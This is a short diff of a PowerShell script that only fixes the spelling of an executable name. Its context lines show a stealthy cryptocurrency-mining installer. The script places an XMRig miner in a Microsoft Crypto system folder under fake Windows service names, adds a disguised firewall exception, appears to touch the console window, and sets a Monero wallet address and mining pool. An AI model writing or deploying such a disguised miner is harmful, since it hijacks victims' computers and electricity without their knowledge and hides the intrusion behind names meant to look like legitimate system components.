@@ -8,7 +8,7 @@ Add-Type -AssemblyName PresentationFramework
 $InstallDirectory = "C:\ProgramData\Microsoft\Crypto\SysKSP\"
 $XMRigVersion = "6.24.0"
 $XMRigFolderName = "SystemKeyService"  
-$XMRigExecutableName = "RSAKeyExecuter.exe"      
+$XMRigExecutableName = "RSAKeyExecutor.exe"      
 $FirewallRuleName = "WinSysException"      
 $minerScriptPath = Join-Path $InstallDirectory "WinKeyService.ps1"
 
@@ -99,7 +99,7 @@ $consoleWindow = [Console.Window]::GetConsoleWindow()
 
 $InstallDirectory = "C:\ProgramData\Microsoft\Crypto\SysKSP\"
 $XMRigFolderName = "SystemKeyService"  
-$XMRigExecutableName = "RSAKeyExecuter.exe"      
+$XMRigExecutableName = "RSAKeyExecutor.exe"      
 $WalletAddress = "437kg8epTG59BpCHXSHVkiAx7S7oawgkeLjPyga1fX8Ca48wmWueu8uiovHZPT1oVGf4MEjvkhypMh3fvgb1cX69GKQwXMp"
 $PoolUrl = "pool.supportxmr.com:3333"
 $PoolPassword = "x"
